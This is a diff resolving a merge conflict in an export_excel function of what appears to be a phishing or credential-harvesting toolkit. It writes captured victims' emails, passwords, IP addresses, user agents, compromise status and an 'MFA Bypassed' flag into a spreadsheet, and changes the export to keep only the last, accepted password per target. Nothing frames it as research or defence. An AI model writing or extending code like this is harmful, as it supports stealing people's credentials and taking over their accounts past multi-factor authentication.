@@ -297,11 +297,7 @@ def export_excel():
         top=Side(style='thin'), bottom=Side(style='thin')
     )
 
-<<<<<<< HEAD
-    headers = ['Email', 'Password', 'Attempt', 'Timestamp', 'IP Address',
-=======
     headers = ['Email', 'Password', 'Timestamp', 'IP Address',
->>>>>>> master
                'User Agent', 'Status', 'MFA Bypassed', 'Released At', 'Notes']
     for col, header in enumerate(headers, 1):
         cell = ws.cell(row=1, column=col, value=header)
@@ -314,21 +310,6 @@ def export_excel():
     for target in targets.values():
         if not target['credentials']:
             continue
-<<<<<<< HEAD
-        for cred in target['credentials']:
-            ws.cell(row=row, column=1, value=target['email']).border = thin_border
-            ws.cell(row=row, column=2, value=cred['password']).border = thin_border
-            ws.cell(row=row, column=3, value=cred['attempt']).border = thin_border
-            ws.cell(row=row, column=4, value=cred['timestamp']).border = thin_border
-            ws.cell(row=row, column=5, value=target['ip']).border = thin_border
-            ws.cell(row=row, column=6, value=target['user_agent']).border = thin_border
-            ws.cell(row=row, column=7, value=target['status']).border = thin_border
-            mfa = 'Yes' if target['status'] in ('compromised', 'released') else 'No'
-            ws.cell(row=row, column=8, value=mfa).border = thin_border
-            ws.cell(row=row, column=9, value=target.get('released_at', '')).border = thin_border
-            ws.cell(row=row, column=10, value=target.get('notes', '')).border = thin_border
-            row += 1
-=======
         # Use the last credential (the accepted one)
         cred = target['credentials'][-1]
         ws.cell(row=row, column=1, value=target['email']).border = thin_border
@@ -342,7 +323,6 @@ def export_excel():
         ws.cell(row=row, column=8, value=target.get('released_at', '')).border = thin_border
         ws.cell(row=row, column=9, value=target.get('notes', '')).border = thin_border
         row += 1
->>>>>>> master
 
     # Auto-width columns
     for col in ws.columns:
